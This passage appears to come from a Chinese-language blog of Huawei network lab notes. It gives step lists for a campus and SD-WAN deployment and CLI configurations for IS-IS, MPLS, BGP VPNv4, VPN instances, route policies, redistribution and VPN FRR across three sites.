src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122130512.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122131391.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122132992.png"></p><p>11 - 创建OA虚拟网络，分配地址和网关，添加有线认证部分</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122133617.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122134728.png"></p><p>12 - 创建RD虚拟网络，分配网段11-15和21-25</p><p>13 - 创建Guest虚拟网络</p><p>14 - 部署VN之间的互通</p><p>15 - 部署无线用户认证（组&#x2F;用户）及授权（密码）</p><p>16 - 创建优秀用户认证（组&#x2F;用户）及授权（密码）</p><p>17 - 创建安全组，资源组（IP&#x2F;掩码）</p><p>18 - 根据要求部署策略矩阵</p><p>19 - 部署准入认证</p><p>20 - 配置授权结果</p><p>21 - 绑定站点</p><p>22 - 创建有线用户的授权规则</p><p>23 - 创建无线用户的授权规则</p><p>24 - 部署无线网络</p><p>25 - 创建无线认证模版</p><p>26 - 交换机的WEB界面中国呢，新建两个SSID模版</p><p>27 - 创建 Guest&#x2F;Employee VAP模版，并调用SSID模版，选择安全模版</p><p>28 - 配置AP组，添加VAP模版</p><h4 id="1、规划资源池"><a href="#1、规划资源池" class="headerlink" title="1、规划资源池"></a>1、规划资源池</h4><h4 id="2、配置VXLAN组网方式"><a href="#2、配置VXLAN组网方式" class="headerlink" title="2、配置VXLAN组网方式"></a>2、配置VXLAN组网方式</h4><h4 id="3、配置DHCP服"><a href="#3、配置DHCP服" class="headerlink" title="3、配置DHCP服"></a>3、配置DHCP服</h4><h4 id="4、配置外部网络接口"><a href="#4、配置外部网络接口" class="headerlink" title="4、配置外部网络接口"></a>4、配置外部网络接口</h4><h4 id="5、配置外部网络接口"><a href="#5、配置外部网络接口" class="headerlink" title="5、配置外部网络接口"></a>5、配置外部网络接口</h4><h4 id="6、配置VN部署"><a href="#6、配置VN部署" class="headerlink" title="6、配置VN部署"></a>6、配置VN部署</h4><h4 id="7、配置VN之间互通"><a href="#7、配置VN之间互通" class="headerlink" title="7、配置VN之间互通"></a>7、配置VN之间互通</h4><h4 id="8、配置认证策略"><a href="#8、配置认证策略" class="headerlink" title="8、配置认证策略"></a>8、配置认证策略</h4><h4 id="9、配置授权规则-授权结果"><a href="#9、配置授权规则-授权结果" class="headerlink" title="9、配置授权规则&#x2F;授权结果"></a>9、配置授权规则&#x2F;授权结果</h4><h4 id="10、配置无线"><a href="#10、配置无线" class="headerlink" title="10、配置无线"></a>10、配置无线</h4><h3 id="SD-WAN"><a href="#SD-WAN" class="headerlink" title="SD-WAN"></a>SD-WAN</h3><h4 id="1、创建WAN侧VN（Y-OA-TO-Sites-Guest-To-Internet-OA-HUB-Spoke组网）"><a href="#1、创建WAN侧VN（Y-OA-TO-Sites-Guest-To-Internet-OA-HUB-Spoke组网）" class="headerlink" title="1、创建WAN侧VN（Y_OA_TO_Sites &#x2F; Guest_To_Internet &#x2F; OA HUB-Spoke组网）"></a>1、创建WAN侧VN（Y_OA_TO_Sites &#x2F; Guest_To_Internet &#x2F; OA HUB-Spoke组网）</h4><h4 id="2、LAN-WAN融合"><a href="#2、LAN-WAN融合" class="headerlink" title="2、LAN&#x2F;WAN融合"></a>2、LAN&#x2F;WAN融合</h4><h4 id="3、WAN组网"><a href="#3、WAN组网" class="headerlink" title="3、WAN组网"></a>3、WAN组网</h4><h4 id="4、Internet访问"><a href="#4、Internet访问" class="headerlink" title="4、Internet访问"></a>4、Internet访问</h4><h4 id="5、监控"><a href="#5、监控" class="headerlink" title="5、监控"></a>5、监控</h4><h4 id="6、订单业务流量做低延迟处理"><a href="#6、订单业务流量做低延迟处理" class="headerlink" title="6、订单业务流量做低延迟处理"></a>6、订单业务流量做低延迟处理</h4><h4 id="7、优化路由"><a href="#7、优化路由" class="headerlink" title="7、优化路由"></a>7、优化路由</h4><hr><h2 id="Z园区：广域网承载及设计"><a href="#Z园区：广域网承载及设计" class="headerlink" title="Z园区：广域网承载及设计"></a>Z园区：广域网承载及设计</h2><h3 id="1、全局ISIS配置-IGB打通"><a href="#1、全局ISIS配置-IGB打通" class="headerlink" title="1、全局ISIS配置(IGB打通)"></a>1、全局ISIS配置(IGB打通)</h3><pre><code class="hljs bash"><span class="hljs-comment"># X/Y/Z_PE1/2</span><span class="hljs-comment">#  network-entity 49.0001.00X0.0000.000X.00</span>bfd quitisis 1 is-level level-2 cost-style wide bfd all-interfaces <span class="hljs-built_in">enable</span> bfd all-interfaces min-tx-interval 500 min-rx-interval 500 network-entity 49.0001.0010.0000.0001.00 domain-authentication-mode md5 plain Huawei@123 frr  loop-free-alternate level-2 <span class="hljs-comment"># 循环-免费-备用</span>  quit quitint lo0 isis <span class="hljs-built_in">enable</span> 1interface GigabitEthernet0/0/0 isis <span class="hljs-built_in">enable</span> 1 isis circuit-type p2p <span class="hljs-comment"># 线路类型</span> isis ppp-negotiation 2-way <span class="hljs-comment"># ppp 协商</span> isis authentication-mode md5 plain Huawei@123interface GigabitEthernet0/0/1 isis <span class="hljs-built_in">enable</span> 1 isis circuit-type p2p isis ppp-negotiation 2-way isis authentication-mode md5 plain Huawei@123interface GigabitEthernet0/0/2 isis <span class="hljs-built_in">enable</span> 1 isis cost 4 isis circuit-type p2p isis ppp-negotiation 2-way isis authentication-mode md5 plain Huawei@123 quit<span class="hljs-comment"># X_PEX 多开窗口</span>dis isis peer <span class="hljs-comment"># 3个</span>dis isis bfd session all <span class="hljs-comment"># 3个</span><span class="hljs-comment"># X_PE1</span>dis ip routing-table 5.0.0.5 verboseint GigabitEthernet 0/0/1 shutdown tracert -a 1.0.0.1 5.0.0.5 undo shutdown quit</code></pre><h3 id="2、-全局MPLS配置"><a href="#2、-全局MPLS配置" class="headerlink" title="2、 全局MPLS配置"></a>2、 全局MPLS配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># X/Y/Z_PE1/2</span><span class="hljs-comment"># mpls lsr-id X.0.0.X</span>bfd mpls-passive quitmpls lsr-id 1.0.0.1mpls mpls bfd <span class="hljs-built_in">enable</span> mpls bfd-trigger host mpls bfd min-tx-interval 500 min-rx-interval 500 quitmpls ldp quitinterface GigabitEthernet0/0/0 mpls mpls ldp mpls mtu 1382 isis ldp-syncinterface GigabitEthernet0/0/1 mpls mpls ldp mpls mtu 1382 isis ldp-syncinterface GigabitEthernet0/0/2 mpls mpls ldp mpls mtu 1382 isis ldp-sync quit<span class="hljs-comment"># 检查</span>dis mpls ldp peer <span class="hljs-comment"># 3个</span>dis mpls bfd session <span class="hljs-comment"># 7个</span>display bfd session all <span class="hljs-comment"># 17个</span>dis isis ldp-sync interface <span class="hljs-comment"># 3个</span></code></pre><h3 id="3、-BGP-65000-group-IBGP-vpnv4配置"><a href="#3、-BGP-65000-group-IBGP-vpnv4配置" class="headerlink" title="3、 BGP 65000 &#x2F; group IBGP &#x2F; vpnv4配置"></a>3、 BGP 65000 &#x2F; group IBGP &#x2F; vpnv4配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># X_PE1/2</span><span class="hljs-comment"># router-id 2.0.0.2</span><span class="hljs-comment"># peer 2.0.0.2 as-number 65000</span><span class="hljs-comment"># peer 2.0.0.2 group IBGP</span><span class="hljs-comment"># peer 2.0.0.2 enable</span>bgp 65000 router-id 1.0.0.1 undo default ipv4-unicast <span class="hljs-comment"># 配置BGP对等体默认不在任何地址族下使能</span> group IBGP internal <span class="hljs-comment"># 创建IBGP对等体组</span> peer IBGP connect-interface Loopback 0 <span class="hljs-comment"># 使用loopback0接口建立BGP邻居关系</span> peer IBGP bfd min-rx-interval 500 min-tx-interval 500 peer IBGP bfd <span class="hljs-built_in">enable</span> peer IBGP password cipher Huawei@123 peer 2.0.0.2 as-number 65000 peer 2.0.0.2 group IBGP peer 3.0.0.3 as-number 65000 peer 3.0.0.3 group IBGP peer 4.0.0.4 as-number 65000 peer 4.0.0.4 group IBGP peer 4.0.0.4 as-number 65000 peer 5.0.0.5 group IBGP peer 5.0.0.5 as-number 65000 peer 6.0.0.6 group IBGP ipv4-family vpnv4  undo policy vpn-target <span class="hljs-comment"># (RR)用来取消对接收的VPN路由或者标签块进行VPN-Target过滤的,保证所有的VPN路由或者标签块都能被接收和处理。</span>  reflector cluster-id 65000 <span class="hljs-comment"># 配置反射器集群ID，所有RR配置相同，建议使用AS号作为集群ID</span>  peer 2.0.0.2 <span class="hljs-built_in">enable</span>  peer 3.0.0.3 <span class="hljs-built_in">enable</span>  peer 3.0.0.3 reflect-client <span class="hljs-comment"># 本机作为路由反射器，并将指定的对等体（组）作为路由反射器的客户。</span>  peer 4.0.0.4 <span class="hljs-built_in">enable</span>  peer 4.0.0.4 reflect-client  peer 5.0.0.5 <span class="hljs-built_in">enable</span>  peer 5.0.0.5 reflect-client  peer 6.0.0.6 <span class="hljs-built_in">enable</span>  peer 6.0.0.6 reflect-client  quit quit<span class="hljs-comment"># Y/Z_PE1/2</span><span class="hljs-comment"># router-id X.0.0.X # 3,4,5,6</span>bgp 65000 router-id 3.0.0.3 undo default ipv4-unicast peer 1.0.0.1 as-number 65000 peer 1.0.0.1 connect-interface LoopBack0 peer 1.0.0.1 bfd <span class="hljs-built_in">enable</span> peer 1.0.0.1 bfd min-tx-interval 500 min-rx-interval 500 peer 1.0.0.1 password cipher Huawei@123 peer 2.0.0.2 as-number 65000 peer 2.0.0.2 connect-interface LoopBack0 peer 2.0.0.2 bfd <span class="hljs-built_in">enable</span> peer 2.0.0.2 bfd min-tx-interval 500 min-rx-interval 500 peer 2.0.0.2 password cipher Huawei@123 <span class="hljs-comment">#</span> ipv4-family vpnv4  peer 1.0.0.1 <span class="hljs-built_in">enable</span>  peer 2.0.0.2 <span class="hljs-built_in">enable</span>  quit<span class="hljs-comment"># 检查</span>dis bgp vpnv4 all peer <span class="hljs-comment"># X5个 Y2个 Z2个</span>dis bgp bfd session all <span class="hljs-comment"># X5个 </span></code></pre><h3 id="4、-65000-65001-VPN-Instance-IP-BGP"><a href="#4、-65000-65001-VPN-Instance-IP-BGP" class="headerlink" title="4、 [65000, 65001] VPN-Instance&#x2F;IP&#x2F;BGP"></a>4、 [65000, 65001] VPN-Instance&#x2F;IP&#x2F;BGP</h3><pre><code class="hljs bash"><span class="hljs-comment">## X_PE1/2</span><span class="hljs-comment"># vpn-instance</span><span class="hljs-comment">#  route-distinguisher 65001:2</span>ip vpn-instance OA ipv4-family  route-distinguisher 65001:1 <span class="hljs-comment"># 配置VPN实例IPv4地址族的RD</span>  vpn-target 1:1 export-extcommunity <span class="hljs-comment"># 必须将对方的export-extcommunity的VPN Target值配置为自己的import-extcommunity的VPN Target值</span>  vpn-target 2:2 import-extcommunity  quit quit<span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#   ip address 10.20.1.10 30</span>dis ip int briefinterface GigabitEthernet2/0/0 ip binding vpn-instance OA ip address 10.20.1.2 30 quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#   peer 10.20.1.9 as-number 65001</span>bgp 65000 ipv4-family vpn-instance OA  peer 10.20.1.1 as-number 65001  quit quit<span class="hljs-comment">## X_T1_Export1</span><span class="hljs-comment"># ip</span><span class="hljs-comment">#  ip address 10.20.1.9 30</span><span class="hljs-comment">#  ip address 10.20.1.6 30</span>interface GigabitEthernet2/0/0 ip address 10.20.1.1 30interface GigabitEthernet2/0/1 ip address 10.20.1.5 30 quitping 10.20.1.2<span class="hljs-comment"># BGP</span><span class="hljs-comment">#  router-id 10.1.0.2</span><span class="hljs-comment">#  peer 10.20.1.10 as-number 65000</span>bgp 65001 router-id 10.1.0.1 dis ip int brief peer 10.20.1.2 as-number 65000 quit</code></pre><h3 id="5、-65000-65003-VPN-Instance-IP-BGP"><a href="#5、-65000-65003-VPN-Instance-IP-BGP" class="headerlink" title="5、 [65000, 65003] VPN-Instance&#x2F;IP&#x2F;BGP"></a>5、 [65000, 65003] VPN-Instance&#x2F;IP&#x2F;BGP</h3><pre><code class="hljs bash"><span class="hljs-comment">## Y_PE1/2</span><span class="hljs-comment"># VPN-Instance</span><span class="hljs-comment">#  route-distinguisher 65003:2</span><span class="hljs-comment">#  route-distinguisher 65003:4</span>ip vpn-instance OA ipv4-family  route-distinguisher 65003:1  vpn-target 1:1 export-extcommunity  vpn-target 2:2 import-extcommunity  quit quitip vpn-instance R&amp;D ipv4-family  route-distinguisher 65003:3  vpn-target 3:3 export-extcommunity  vpn-target 4:4 import-extcommunity  quit quit<span class="hljs-comment"># IP binding vpn-instance</span><span class="hljs-comment">#  ip address 10.20.2.10 30</span><span class="hljs-comment">#  ip address 10.20.2.14 30</span>interface GigabitEthernet2/0/0.10 dot1q termination vid 10 <span class="hljs-comment"># 开启识别802.1Q数据帧，同时将子接口划分给相应的vlan</span> ip binding vpn-instance OA ip address 10.20.2.2 30 arp broadcast <span class="hljs-built_in">enable</span>interface GigabitEthernet2/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip address 10.20.2.6 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#  peer 10.20.2.9 as-number 65003</span><span class="hljs-comment">#  peer 10.20.2.13 as-number 65003</span>bgp 65000 ipv4-family vpn-instance OA  peer 10.20.2.1 as-number 65003 ipv4-family vpn-instance R&amp;D  peer 10.20.2.5 as-number 65003  quit quit<span class="hljs-comment">## Y_Export1</span><span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  interface GigabitEthernet2/0/1.10</span><span class="hljs-comment">#   ip address 10.20.2.9 30</span><span class="hljs-comment">#  interface GigabitEthernet2/0/1.20</span><span class="hljs-comment">#   ip address 10.20.2.13 30</span>interface GigabitEthernet2/0/0.10 dot1q termination vid 10 ip binding vpn-instance vpn2 ip address 10.20.2.1 30 arp broadcast <span class="hljs-built_in">enable</span>interface GigabitEthernet2/0/0.20 dot1q termination vid 20 ip binding vpn-instance vpn3 ip address 10.20.2.5 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment"># BGP绑定VPN-instance</span>bgp 65003 ipv4-family vpn-instance vpn2  peer 10.20.2.2 as-number 65000  peer 10.20.2.2 ip-prefix deny_default <span class="hljs-built_in">export</span>  peer 10.20.2.10 as-number 65000  peer 10.20.2.10 ip-prefix deny_default <span class="hljs-built_in">export</span>  ipv4-family vpn-instance vpn3  peer 10.20.2.6 as-number 65000  peer 10.20.2.14 as-number 65000  quit quit</code></pre><h3 id="6、-65000-65004-VPN-Instance-IP-BGP"><a href="#6、-65000-65004-VPN-Instance-IP-BGP" class="headerlink" title="6、 [65000, 65004] VPN-Instance&#x2F;IP&#x2F;BGP"></a>6、 [65000, 65004] VPN-Instance&#x2F;IP&#x2F;BGP</h3><pre><code class="hljs bash"><span class="hljs-comment">## Z_PE1/2</span><span class="hljs-comment"># vpn-instance</span><span class="hljs-comment">#  route-distinguisher 65004:3</span><span class="hljs-comment">#  route-distinguisher 65004:4</span><span class="hljs-comment">#  route-distinguisher 65004:6</span>ip vpn-instance OA_In ipv4-family  route-distinguisher 65004:1  vpn-target 1:1 import-extcommunityip vpn-instance OA_Out ipv4-family  route-distinguisher 65004:2  vpn-target 2:2 export-extcommunityip vpn-instance R&amp;D ipv4-family  route-distinguisher 65004:5  vpn-target 3:3 import-extcommunity  vpn-target 4:4 export-extcommunity  quit quit<span class="hljs-comment">#</span>dis bgp vpnv4 all peer <span class="hljs-comment"># Y=4</span><span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  ip add 10.20.3.14 30</span><span class="hljs-comment">#  ip add 10.20.3.18 30</span><span class="hljs-comment">#  ip add 10.20.3.22 30</span>int g 2/0/0.10 dot1q termination vid 10 ip binding vpn-instance OA_In ip add 10.20.3.2 30 arp broadcast <span class="hljs-built_in">enable</span>int g 2/0/0.11 dot1q termination vid 11 ip binding vpn-instance OA_Out ip add 10.20.3.6 30 arp broadcast <span class="hljs-built_in">enable</span>int g 2/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip add 10.20.3.10 30 arp broadcast <span class="hljs-built_in">enable</span> quit<span class="hljs-comment"># BGP绑定VPN-instance</span><span class="hljs-comment">#  peer 10.20.3.13 as-number 65004</span><span class="hljs-comment">#  peer 10.20.3.17 as-number 65004</span><span class="hljs-comment">#  peer 10.20.3.21 as-number 65004</span>bgp 65000 ipv4-family vpn-instance OA_In  peer 10.20.3.1 as-number 65004 ipv4-family vpn-instance OA_Out  peer 10.20.3.5 as-number 65004  peer 10.20.3.5 allow-as-loop ipv4-family vpn-instance R&amp;D  peer 10.20.3.9 as-number 65004  quit quit<span class="hljs-comment">## Z_Export1</span><span class="hljs-comment"># vpn-instance</span>ip vpn-instance OA route-distinguisher 65004:10  quitip vpn-instance R&amp;D route-distinguisher 65004:20  quit<span class="hljs-comment">#</span>int lo0 ip binding vpn-instance OA ip add 10.3.101.254 24int lo1 ip binding vpn-instance R&amp;D ip add 10.3.99.254 24int lo2 ip binding vpn-instance R&amp;D ip add 10.3.100.254 24 quit<span class="hljs-comment"># ip binding vpn-instance</span><span class="hljs-comment">#  int g 0/0/1.10</span><span class="hljs-comment">#   ip add 10.20.3.13 30</span><span class="hljs-comment">#  int g 0/0/1.11</span><span class="hljs-comment">#   ip add 10.20.3.17 30</span><span class="hljs-comment">#  int g 0/0/1.20</span><span class="hljs-comment">#   ip add 10.20.3.21 30</span>int g 0/0/0.10 dot1q termination vid 10 ip binding vpn-instance OA ip add 10.20.3.1 30 arp broadcast <span class="hljs-built_in">enable</span>int g 0/0/0.11 dot1q termination vid 11 ip binding vpn-instance OA ip add 10.20.3.5 30 arp broadcast <span class="hljs-built_in">enable</span>int g 0/0/0.20 dot1q termination vid 20 ip binding vpn-instance R&amp;D ip add 10.20.3.9 30 arp broadcast <span class="hljs-built_in">enable</span> quitdis ip int brief<span class="hljs-comment"># BGP绑定VPN-Instance</span>bgp 65004 router-id 10.3.99.254 undo default ipv4-unicast ipv4-family vpn-instance OA  peer 10.20.3.2 as-number 65000  peer 10.20.3.6 as-number 65000  peer 10.20.3.14 as-number 65000  peer 10.20.3.18 as-number 65000 ipv4-family vpn-instance R&amp;D  peer 10.20.3.10 as-number 65000  peer 10.20.3.22 as-number 65000  quit quit<span class="hljs-comment"># to-do</span>bgp 65004 ipv4-family vpn-instance OA  network 10.3.101.0 24  quit ipv4-family vpn-instance R&amp;D  network 10.3.99.0 24  network 10.3.100.0 24  quit quit</code></pre><h3 id="7、配置PE-BGP-export-route-policy"><a href="#7、配置PE-BGP-export-route-policy" class="headerlink" title="7、配置PE BGP export route-policy"></a>7、配置PE BGP export route-policy</h3><pre><code class="hljs bash"><span class="hljs-comment">## X_PE1 oa主路径</span>route-policy oa_med permit node 10 apply cost-type internal <span class="hljs-comment"># 继承</span> quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA  dis this  peer 10.20.1.1 route-policy oa_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## X_PE2 oa备用路径</span>route-policy oa_med permit node 10 apply cost 12 quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA  dis this  peer 10.20.1.9 route-policy oa_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Y_PE1 oa主路径，rd备路径</span>route-policy oa_med permit node 10 apply cost-type internal quitroute-policy rd_med permit node 10 apply cost 12 quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA  dis this  peer 10.20.2.1 route-policy oa_med <span class="hljs-built_in">export</span>  quit ipv4-family vpn-instance R&amp;D  dis this  peer 10.20.2.5 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Y_PE2 oa备路径，rd主路径</span>route-policy oa_med permit node 10 apply cost 12 quitroute-policy rd_med permit node 10 apply cost-type internal quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA  dis this  peer 10.20.2.9 route-policy oa_med <span class="hljs-built_in">export</span>  quit ipv4-family vpn-instance R&amp;D  dis this  peer 10.20.2.13 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Z_PE1 oa主路径，rd备路径</span>route-policy oa_med permit node 10 apply cost-type internal quitroute-policy rd_med permit node 10 apply cost 12 quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA_In  dis this  peer 10.20.3.1 route-policy oa_med <span class="hljs-built_in">export</span>  quit ipv4-family vpn-instance R&amp;D  dis this  peer 10.20.3.9 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Z_PE2 oa备路径，rd主路径</span>route-policy oa_med permit node 10 apply cost 12 quitroute-policy rd_med permit node 10 apply cost-type internal quit<span class="hljs-comment">#</span>bgp 65000 ipv4-family vpn-instance OA_In  dis this  peer 10.20.3.13 route-policy oa_med <span class="hljs-built_in">export</span>  quit ipv4-family vpn-instance R&amp;D  dis this  peer 10.20.3.21 route-policy rd_med <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment"># 检查</span><span class="hljs-comment">## Z_Export1</span>dis bgp vpnv4 all peer <span class="hljs-comment"># 6</span><span class="hljs-comment">## X_T_Export1/2</span>dis bgp routing-table <span class="hljs-comment"># 21</span><span class="hljs-comment">## Y_Export1</span>dis ip routing-table vpn-instance vpn2 <span class="hljs-comment"># 64 63</span>dis bgp vpnv4 vpn-instance vpn2 routing-table <span class="hljs-comment"># 42</span>dis bgp vpnv4 vpn-instance vpn3 routing-table <span class="hljs-comment"># 30 -------to do</span><span class="hljs-comment">## Z_Export1</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 41</span>dis bgp vpnv4 vpn-instance R&amp;D routing-table <span class="hljs-comment"># 28</span><span class="hljs-comment">## Z_PE1</span>dis bgp vpnv4 vpn-instance OA_In routing-table <span class="hljs-comment"># 41 --- to do 21</span>dis bgp vpnv4 vpn-instance OA_Out routing-table <span class="hljs-comment"># 21</span></code></pre><h3 id="8、Y过滤路由-X双点双路路由重发布"><a href="#8、Y过滤路由-X双点双路路由重发布" class="headerlink" title="8、Y过滤路由,X双点双路路由重发布"></a>8、Y过滤路由,X双点双路路由重发布</h3><pre><code class="hljs bash"><span class="hljs-comment">## Y_Export1 ----- to do</span>ip ip-prefix deny_Default deny 0.0.0.0 0ip ip-prefix deny_Default permit 0.0.0.0 0 less-equal 32bgp 65003 ipv4-family vpn-instance vpn2  dis this  peer 10.20.2.2 ip-prefix deny_Default <span class="hljs-built_in">export</span>  peer 10.20.2.10 ip-prefix deny_Default <span class="hljs-built_in">export</span>  quit quit<span class="hljs-comment">## Y_Export1</span>dis cur int lo 1ip ip-prefix OA permit 10.2.0.0 16 greater-equal 24 less-equal 24 ip ip-prefix OA permit 10.100.2.0 24dis cur int lo 2ip ip-prefix R&amp;D permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix R&amp;D permit 10.100.3.0 24bgp 65003 ipv4-family vpn-instance vpn2  dis this  peer 10.20.2.2 ip-prefix OA <span class="hljs-built_in">export</span>  peer 10.20.2.10 ip-prefix OA <span class="hljs-built_in">export</span> ipv4-family vpn-instance vpn3  dis this  peer 10.20.2.6 ip-prefix R&amp;D <span class="hljs-built_in">export</span>  peer 10.20.2.14 ip-prefix R&amp;D <span class="hljs-built_in">export</span>  quit quit  <span class="hljs-comment">## X_T_Export1</span>acl 2001 rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 quitroute-policy b2o permit node 10 apply tag 10 quitroute-policy o2b deny node 10 if-match tag 20 quitroute-policy o2b permit node 20 if-match acl 2001 quitdis cur config route-policy<span class="hljs-comment">#</span>ospf 1 import-route bgp route-policy b2o default cost inherit-metric quitbgp 65001 preference 120 255 255 import-route ospf 1 route-policy o2b network 10.20.1.4 30 quit<span class="hljs-comment">## X_T_Export2</span>acl 2001 rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255 rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 quitroute-policy b2o permit node 10 apply tag 20 quitroute-policy o2b deny node 10 if-match tag 10 quitroute-policy o2b permit node 20 if-match acl 2001 quit<span class="hljs-comment">#</span>ospf 1 import-route bgp route-policy b2o default cost inherit-metric quitbgp 65001 preference 120 255 255 import-route ospf 1 route-policy o2b quitdis ip routing-table 10.2.31.0dis ip routing-table 10.2.51.0dis ip routing-table protocol ospf  <span class="hljs-comment"># 70 49 21</span><span class="hljs-comment">## X_PE1</span>dis ip routing-table vpn-instance OA <span class="hljs-comment"># 51</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 120</span><span class="hljs-comment">## X_PE1</span>dis bgp vpnv4 vpn-instance OA routing-table <span class="hljs-comment"># 112</span><span class="hljs-comment">## X_T1_CORE</span>dis ip routing-table protocol ospf <span class="hljs-comment"># 67</span><span class="hljs-comment">## Y_PE1</span>dis ip routing-table vpn-instance OA 10.3.101.0 verbose</code></pre><h3 id="9、VPN-FRR与-MPLS-MTU"><a href="#9、VPN-FRR与-MPLS-MTU" class="headerlink" title="9、VPN FRR与 MPLS MTU"></a>9、VPN FRR与 MPLS MTU</h3><pre><code class="hljs bash"><span class="hljs-comment">## X/Y_PE1</span>route-policy vpnfrr permit node 10 apply backup-interface g 0/0/2  apply backup-nexthop 6.0.0.6 quitip vpn-instance OA vpn frr route-policy vpnfrr quit<span class="hljs-comment"># X_PE1</span>dis ip routing-table vpn-instance OA 10.2.31.0 verbose<span class="hljs-comment"># Y_PE1</span>dis ip routing-table vpn-instance OA 10.3.101.0 verbose</code></pre><h3 id="10、QOS-FW-Test"><a href="#10、QOS-FW-Test" class="headerlink" title="10、QOS &amp; FW &amp; Test"></a>10、QOS &amp; FW &amp; Test</h3><pre><code class="hljs bash"><span class="hljs-comment">## Y_Export1</span>acl number 3001 rule permit ip <span class="hljs-built_in">source</span> 10.2.11.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.12.0 0.0.0.255 rule permit ip <span class="hljs-built_in">source</span> 10.2.13.0 0.0.0.255 rule permit ip <span 